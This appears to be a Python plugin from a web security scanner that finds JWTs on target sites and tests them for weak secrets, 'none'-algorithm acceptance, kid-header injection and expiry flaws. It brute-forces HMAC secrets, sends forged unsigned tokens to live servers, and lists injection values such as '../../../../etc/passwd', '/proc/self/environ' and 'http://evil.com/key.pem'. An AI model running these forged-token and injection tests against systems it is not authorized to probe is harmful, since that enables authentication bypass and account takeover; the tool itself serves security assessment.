# plugins/web/jwt_token_analyzer.py
import re
import base64
import json
import hmac
import hashlib
import time
from urllib.parse import urlparse
import requests

PRIORITY = 37
TYPE = "Web Security"
DESCRIPTION = "JWT token security analysis and vulnerability testing"

class JWTTokenAnalyzer:
    def __init__(self):
        # JWT regex patterns
        self.jwt_pattern = r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'
        
        # Common JWT locations
        self.jwt_locations = [
            "Authorization: Bearer ",
            "access_token=",
            "id_token=",
            "token=",
            "jwt=",
            "session=",
            "Set-Cookie: token=",
            "X-Auth-Token: ",
            "X-Access-Token: "
        ]
        
        # Common JWT secrets for brute force
        self.common_secrets = [
            "secret",
            "password",
            "123456",
            "qwerty",
            "admin",
            "jwtsecret",
            "supersecret",
            "changeme",
            "default",
            "token",
            "access",
            "master",
            "key",
            "jwtkey",
            "security"
        ]
        
        # JWT security tests
        self.security_tests = [
            {
                "name": "Algorithm Confusion",
                "description": "Test for algorithm confusion attacks (RS256 to HS256)",
                "test": self.test_algorithm_confusion
            },
            {
                "name": "Weak Secret",
                "description": "Test for weak JWT secrets",
                "test": self.test_weak_secret
            },
            {
                "name": "No Signature",
                "description": "Test if JWT accepts tokens with 'none' algorithm",
                "test": self.test_none_algorithm
            },
            {
                "name": "Kid Header Injection",
                "description": "Test for kid header injection vulnerabilities",
                "test": self.test_kid_injection
            },
            {
                "name": "Expiration Check",
                "description": "Check if tokens have proper expiration",
                "test": self.test_expiration
            },
            {
                "name": "JWT Structure",
                "description": "Analyze JWT structure for vulnerabilities",
                "test": self.test_jwt_structure
            }
        ]
    
    def extract_jwts(self, response_text, response_headers):
        """Extract JWT tokens from response"""
        tokens = []
        
        # Search in text
        text_matches = re.findall(self.jwt_pattern, response_text)
        tokens.extend(text_matches)
        
        # Search in headers
        headers_text = json.dumps(dict(response_headers))
        header_matches = re.findall(self.jwt_pattern, headers_text)
        tokens.extend(header_matches)
        
        # Search in Set-Cookie headers
        if isinstance(response_headers, dict):
            for header, value in response_headers.items():
                if header.lower() == "set-cookie":
                    cookie_matches = re.findall(self.jwt_pattern, value)
                    tokens.extend(cookie_matches)
        
        return list(set(tokens))
    
    def decode_jwt(self, token):
        """Decode JWT token without verification"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None
            
            # Decode header and payload
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=' * (4 - len(parts[0]) % 4)).decode())
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=' * (4 - len(parts[1]) % 4)).decode())
            
            return {
                "header": header,
                "payload": payload,
                "signature": parts[2],
                "raw": token
            }
        except:
            return None
    
    def test_algorithm_confusion(self, token, original_url, session):
        """Test for algorithm confusion attacks"""
        results = {
            "test": "Algorithm Confusion",
            "vulnerable": False,
            "details": "",
            "error": None
        }
        
        decoded = self.decode_jwt(token)
        if not decoded:
            results["error"] = "Invalid JWT"
            return results
        
        header = decoded["header"]
        payload = decoded["payload"]
        
        # Check if token uses RS256
        if header.get("alg") != "RS256":
            results["details"] = f"Algorithm is {header.get('alg')}, not RS256"
            return results
        
        print(f"    ┃   │   │   ├ RS256 detected, testing confusion...")
        
        # Try to convert to HS256 with various public keys
        public_keys = [
            "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...",  # Example
            "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7...",
            "-----BEGIN RSA PUBLIC KEY-----\nMIIBCgKCAQEA..."
        ]
        
        # We can't actually test without the real public key, but we can check for vulnerabilities
        results["details"] = "RS256 detected - manually test with: jwt.io or jwt_tool"
        results["vulnerable"] = "POTENTIAL"  # Mark as potential
        
        return results
    
    def test_weak_secret(self, token, original_url, session):
        """Test for weak JWT secrets"""
        results = {
            "test": "Weak Secret",
            "vulnerable": False,
            "details": "",
            "error": None,
            "cracked_secret": None
        }
        
        decoded = self.decode_jwt(token)
        if not decoded:
            results["error"] = "Invalid JWT"
            return results
        
        header = decoded["header"]
        alg = header.get("alg", "HS256")
        
        # Only test HS256/HS384/HS512
        if not alg.startswith("HS"):
            results["details"] = f"Algorithm {alg} not supported for secret testing"
            return results
        
        print(f"    ┃   │   │   ├ Testing common secrets...")
        
        # Try common secrets
        for secret in self.common_secrets:
            if self.verify_jwt(token, secret, alg):
                results["vulnerable"] = True
                results["cracked_secret"] = secret
                results["details"] = f"Weak secret found: '{secret}'"
                break
        
        if not results["vulnerable"]:
            results["details"] = "No weak secrets found (tested common ones)"
        
        return results
    
    def test_none_algorithm(self, token, original_url, session):
        """Test if JWT accepts 'none' algorithm"""
        results = {
            "test": "No Signature",
            "vulnerable": False,
            "details": "",
            "error": None
        }
        
        decoded = self.decode_jwt(token)
        if not decoded:
            results["error"] = "Invalid JWT"
            return results
        
        # Create a token with 'none' algorithm
        header = decoded["header"].copy()
        payload = decoded["payload"].copy()
        
        # Modify algorithm to 'none'
        header["alg"] = "none"
        
        # Re-encode token
        none_token = self.create_jwt(header, payload, "")
        
        # Test if the modified token is accepted
        test_result = self.test_jwt_acceptance(none_token, original_url, session)
        
        if test_result.get("accepted"):
            results["vulnerable"] = True
            results["details"] = "Token with 'none' algorithm accepted"
        else:
            results["details"] = "Token with 'none' algorithm rejected"
        
        return results
    
    def test_kid_injection(self, token, original_url, session):
        """Test for kid header injection vulnerabilities"""
        results = {
            "test": "Kid Header Injection",
            "vulnerable": False,
            "details": "",
            "error": None
        }
        
        decoded = self.decode_jwt(token)
        if not decoded:
            results["error"] = "Invalid JWT"
            return results
        
        header = decoded["header"]
        payload = decoded["payload"]
        
        # Check if token has kid header
        if "kid" not in header:
            results["details"] = "No kid header in token"
            return results
        
        print(f"    ┃   │   │   ├ Testing kid injection...")
        
        # Try various kid injections
        kid_injections = [
            "../../../../etc/passwd",
            "file:///etc/passwd",
            "http://evil.com/key.pem",
            "/proc/self/environ",
            "/var/www/html/config.php"
        ]
        
        for kid in kid_injections[:3]:  # Test first 3
            # Create modified token with injected kid
            modified_header = header.copy()
            modified_header["kid"] = kid
            
            # Create token with same payload but modified kid
            # Note: We need to sign it properly for the test to be valid
            # For now, we'll just create unsigned token for structure test
            modified_token = self.create_jwt(modified_header, payload, "")
            
            # Check if token structure is valid (basic test)
            if self.decode_jwt(modified_token):
                results["details"] = f"Token with kid '{kid[:20]}...' has valid structure"
                results["vulnerable"] = "POTENTIAL"  # Manual verification needed
        
        return results
    
    def test_expiration(self, token, original_url, session):
        """Check if tokens have proper expiration"""
        results = {
            "test": "Expiration Check",
            "vulnerable": False,
            "details": "",
            "error": None
        }
        
        decoded = self.decode_jwt(token)
        if not decoded:
            results["error"] = "Invalid JWT"
            return results
        
        payload = decoded["payload"]
        
        # Check for expiration claim
        if "exp" not in payload:
            results["vulnerable"] = True
            results["details"] = "No expiration (exp) claim in token"
        else:
            exp_time = payload["exp"]
            current_time = int(time.time())
            
            if exp_time < current_time:
                results["vulnerable"] = True
                results["details"] = f"Token expired {current_time - exp_time} seconds ago"
            else:
                ttl = exp_time - current_time
                if ttl > 7 * 24 * 60 * 60:  # More than 7 days
                    results["vulnerable"] = True
                    results["details"] = f"Long expiration: {ttl//(24*60*60)} days"
                else:
                    results["details"] = f"Expires in {ttl//3600} hours"
        
        # Check for nbf (not before) claim
        if "nbf" in payload:
            nbf_time = payload["nbf"]
            if nbf_time > time.time():
                results["details"] += f" | Not valid for another {nbf_time - int(time.time())} seconds"
        
        return results
    
    def test_jwt_structure(self, token, original_url, session):
        """Analyze JWT structure for vulnerabilities"""
        results = {
            "test": "JWT Structure",
            "vulnerable": False,
            "details": "",
            "error": None,
            "analysis": {}
        }
        
        decoded = self.decode_jwt(token)
        if not decoded:
            results["error"] = "Invalid JWT"
            return results
        
        header = decoded["header"]
        payload = decoded["payload"]
        
        analysis = {
            "algorithm": header.get("alg", "unknown"),
            "token_type": header.get("typ", "JWT"),
            "claims": list(payload.keys()),
            "sensitive_claims": [],
            "missing_standard_claims": []
        }
        
        # Check for sensitive data in payload
        sensitive_patterns = [
            ("password", r'password|passwd|pwd'),
            ("secret", r'secret|private|key'),
            ("email", r'email|mail'),
            ("phone", r'phone|mobile|tel'),
            ("address", r'address|street|city|zip'),
            ("ssn", r'ssn|social|security')
        ]
        
        payload_str = json.dumps(payload).lower()
        for name, pattern in sensitive_patterns:
            if re.search(pattern, payload_str):
                analysis["sensitive_claims"].append(name)
        
        # Check for standard claims
        standard_claims = ["iss", "sub", "aud", "exp", "nbf", "iat", "jti"]
        missing = [claim for claim in standard_claims if claim not in payload]
        if missing:
            analysis["missing_standard_claims"] = missing
        
        # Check for algorithm vulnerabilities
        alg = header.get("alg", "").upper()
        if alg in ["NONE", "NULL"]:
            analysis["algorithm_vulnerable"] = True
            results["vulnerable"] = True
            results["details"] = f"Algorithm '{alg}' is vulnerable"
        
        results["analysis"] = analysis
        
        if not results["details"]:
            results["details"] = f"Algorithm: {alg}, Claims: {len(payload)}"
        
        return results
    
    def verify_jwt(self, token, secret, algorithm="HS256"):
        """Verify JWT signature with given secret"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return False
            
            header_b64, payload_b64, signature_b64 = parts
            
            # Recreate the signing input
            signing_input = f"{header_b64}.{payload_b64}"
            
            # Verify based on algorithm
            if algorithm.upper() == "HS256":
                expected = base64.urlsafe_b64encode(
                    hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
                ).decode().replace('=', '')
                return expected == signature_b64
            elif algorithm.upper() == "HS384":
                expected = base64.urlsafe_b64encode(
                    hmac.new(secret.encode(), signing_input.encode(), hashlib.sha384).digest()
                ).decode().replace('=', '')
                return expected == signature_b64
            elif algorithm.upper() == "HS512":
                expected = base64.urlsafe_b64encode(
                    hmac.new(secret.encode(), signing_input.encode(), hashlib.sha512).digest()
                ).decode().replace('=', '')
                return expected == signature_b64
        
        except:
            return False
        
        return False
    
    def create_jwt(self, header, payload, signature=""):
        """Create a JWT token"""
        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().replace('=', '')
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().replace('=', '')
        
        if signature:
            return f"{header_b64}.{payload_b64}.{signature}"
        else:
            return f"{header_b64}.{payload_b64}."
    
    def test_jwt_acceptance(self, token, original_url, session):
        """Test if a modified JWT is accepted by the server"""
        # This is a simplified test - in reality, you'd need to use the token
        # in the appropriate context (Authorization header, cookie, etc.)
        
        # Try different locations for the token
        test_locations = [
            ("Authorization", f"Bearer {token}"),
            ("Cookie", f"token={token}"),
            ("X-Auth-Token", token)
        ]
        
        for header_name, header_value in test_locations:
            try:
                headers = {header_name: header_value}
                response = session.get(original_url, headers=headers, timeout=5)
                
                # Check if request was successful (not 401/403)
                if response.status_code not in [401, 403, 400]:
                    return {"accepted": True, "header": header_name, "status": response.status_code}
                    
            except:
                pass
        
        return {"accepted": False}
    
    def analyze_single_target(self, url, session):
        """Complete analysis of a single target"""
        print(f"    ┃   ├ Testing: {url}")
        
        results = {
            "url": url,
            "jwt_tokens": [],
            "security_tests": {},
            "vulnerabilities": [],
            "error": None
        }
        
        try:
            # First, make a request to find JWTs
            response = session.get(url, timeout=5)
            
            # Extract JWTs from response
            tokens = self.extract_jwts(response.text, response.headers)
            results["jwt_tokens"] = tokens
            
            if not tokens:
                print(f"    ┃   │   └ No JWT tokens found")
                return results
            
            print(f"    ┃   │   ├ Found {len(tokens)} JWT token(s)")
            
            # Analyze each token
            for i, token in enumerate(tokens[:2]):  # Analyze first 2 tokens
                print(f"    ┃   │   │   ├ Token {i+1}: {token[:30]}...")
                
                # Decode token for basic info
                decoded = self.decode_jwt(token)
                if decoded:
                    alg = decoded["header"].get("alg", "unknown")
                    print(f"    ┃   │   │   │   ├ Algorithm: {alg}")
                
                # Run security tests on this token
                token_results = {}
                for test in self.security_tests:
                    test_result = test["test"](token, url, session)
                    token_results[test["name"]] = test_result
                    
                    if test_result.get("vulnerable"):
                        results["vulnerabilities"].append({
                            "token": token[:50] + "...",
                            "test": test["name"],
                            "details": test_result.get("details", "")
                        })
                
                results["security_tests"][f"token_{i+1}"] = token_results
            
        except Exception as e:
            results["error"] = str(e)
            print(f"    ┃   │   └ Error: {str(e)[:50]}")
        
        return results

def run(kb):
    """Plugin entry point"""
    print(f"\n[*] Running {DESCRIPTION}...")
    
    analyzer = JWTTokenAnalyzer()
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/html"
    })
    
    # Get targets from KnowledgeBase
    targets = []
    
    # Get from web servers with authentication
    web_analysis = kb.get("web_logic_analysis", {})
    if web_analysis and "results" in web_analysis:
        for result in web_analysis["results"]:
            if result.get("status_code") == 200:
                # Check if it has authentication forms
                if result.get("auth_flows", {}).get("login_forms"):
                    targets.append(result["target"])
    
    # Also check API endpoints
    if web_analysis and "results" in web_analysis:
        for result in web_analysis["results"]:
            if result.get("api_endpoints", {}).get("rest"):
                targets.append(result["target"])
    
    targets = list(set(targets))
    
    if not targets:
        print("    ╚ No targets found for JWT analysis (need sites with auth/APIs)")
        return
    
    print(f"    ╠ Targets to test: {len(targets)}")
    
    all_results = []
    jwt_found = 0
    vulnerabilities_found = 0
    
    for target in targets[:5]:  # Limit to 5
        result = analyzer.analyze_single_target(target, session)
        all_results.append(result)
        
        if result["jwt_tokens"]:
            jwt_found += len(result["jwt_tokens"])
        
        if result["vulnerabilities"]:
            vulnerabilities_found += len(result["vulnerabilities"])
    
    # Save to KnowledgeBase
    summary = {
        "total_targets": len(all_results),
        "jwt_tokens_found": jwt_found,
        "vulnerabilities_found": vulnerabilities_found,
        "results": all_results
    }
    
    kb.update("jwt_analysis", summary)
    
    # Generate report
    print(f"\n    ╔═══════════════════════════════════════════════")
    print(f"    ║ JWT SECURITY ANALYSIS COMPLETE")
    print(f"    ║ Targets analyzed: {len(all_results)}")
    print(f"    ║ JWT tokens found: {jwt_found}")
    print(f"    ║ Security vulnerabilities: {vulnerabilities_found}")
    
    if vulnerabilities_found > 0:
        print(f"    ║")
        print(f"    ║ VULNERABLE TARGETS:")
        
        for result in all_results:
            if result["vulnerabilities"]:
                print(f"    ║   • {result['url']}")
                
                for vuln in result["vulnerabilities"][:2]:
                    severity = "CRITICAL" if any(x in vuln["test"] for x in ["Algorithm", "Secret", "none"]) else "MEDIUM"
                    print(f"    ║     [{severity}] {vuln['test']}: {vuln['details'][:50]}")
    
    # Common JWT vulnerabilities
    if jwt_found > 0:
        print(f"    ║")
        
        # Count algorithm types
        algorithms = []
        for result in all_results:
            for token_key, tests in result.get("security_tests", {}).items():
                structure_test = tests.get("JWT Structure", {})
                if structure_test.get("analysis"):
                    alg = structure_test["analysis"].get("algorithm")
                    if alg:
                        algorithms.append(alg)
        
        if algorithms:
            from collections import Counter
            alg_counts = Counter(algorithms)
            print(f"    ║ ALGORITHM DISTRIBUTION:")
            for alg, count in alg_counts.most_common():
                print(f"    ║   {alg}: {count}")
        
        # Check for missing expiration
        no_exp_count = 0
        for result in all_results:
            for token_key, tests in result.get("security_tests", {}).items():
                exp_test = tests.get("Expiration Check", {})
                if exp_test.get("vulnerable") and "No expiration" in exp_test.get("details", ""):
                    no_exp_count += 1
        
        if no_exp_count > 0:
            print(f"    ║")
            print(f"    ║ WARNING: {no_exp_count} tokens without expiration!")
            print(f"    ║   These tokens never expire - session fixation risk")
    
    if vulnerabilities_found > 0:
        print(f"    ║")
        print(f"    ║ ⚠️  SECURITY WARNING")
        print(f"    ║ JWT vulnerabilities detected!")
        print(f"    ║ These can lead to authentication bypass, privilege escalation,")
        print(f"    ║ and session hijacking.")
        
        # Add to security alerts
        current_alerts = kb.get("security_alerts", {})
        current_alerts["jwt_vulnerabilities"] = {
            "status": "HIGH",
            "vulnerabilities_found": vulnerabilities_found,
            "details": "JWT vulnerabilities can allow attackers to forge tokens, bypass authentication, and escalate privileges."
        }
        kb.update("security_alerts", current_alerts)
    
    print(f"    ╚═══════════════════════════════════════════════")
